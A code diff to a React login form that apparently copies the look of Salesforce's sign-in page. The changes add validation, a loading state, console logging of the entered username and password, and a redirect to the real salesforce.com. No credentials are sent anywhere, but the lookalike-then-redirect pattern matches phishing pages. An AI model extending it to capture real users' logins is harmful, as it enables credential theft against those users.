@@ -1,5 +1,4 @@
 "use client"
-
 import { useState } from "react"
 import Link from "next/link"
 import { Button } from "@/components/ui/button"
@@ -13,10 +12,27 @@ export function LoginForm() {
     password: "",
     remember: false,
   })
+  const [isLoading, setIsLoading] = useState(false)
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    
+    // Basic validation
+    if (!formData.username || !formData.password) {
+      alert("Please enter both username and password")
+      return
+    }
+
     console.log("Login attempt:", formData)
+    setIsLoading(true)
+    
+    // Redirect to Salesforce
+    try {
+      window.location.href = "https://www.salesforce.com"
+    } catch (error) {
+      // Fallback method
+      window.open("https://www.salesforce.com", "_self")
+    }
   }
 
   return (
@@ -37,10 +53,10 @@ export function LoginForm() {
                 username: e.target.value,
               }))
             }
+            disabled={isLoading}
             required
           />
         </div>
-
         <div className="space-y-2">
           <label className="block text-[13px] text-gray-700 font-normal" htmlFor="password">
             Password
@@ -56,17 +72,17 @@ export function LoginForm() {
                 password: e.target.value,
               }))
             }
+            disabled={isLoading}
             required
           />
         </div>
-
         <Button
           type="submit"
           className="w-full h-[42px] bg-[#0176D3] hover:bg-[#0176D3]/90 text-white font-normal text-[16px]"
+          disabled={isLoading}
         >
-          Log In
+          {isLoading ? "Logging in..." : "Log In"}
         </Button>
-
         <div className="flex items-center pt-1">
           <Checkbox
             id="remember"
@@ -78,13 +94,13 @@ export function LoginForm() {
                 remember: checked as boolean,
               }))
             }
+            disabled={isLoading}
           />
           <label htmlFor="remember" className="ml-2 text-[13px] text-gray-700 cursor-pointer">
             Remember me
           </label>
         </div>
       </form>
-
       <div className="mt-6 flex justify-between text-[13px]">
         <Link href="#" className="text-[#0176D3] hover:underline">
           Forgot Your Password?
@@ -96,4 +112,3 @@ export function LoginForm() {
     </div>
   )
 }
-
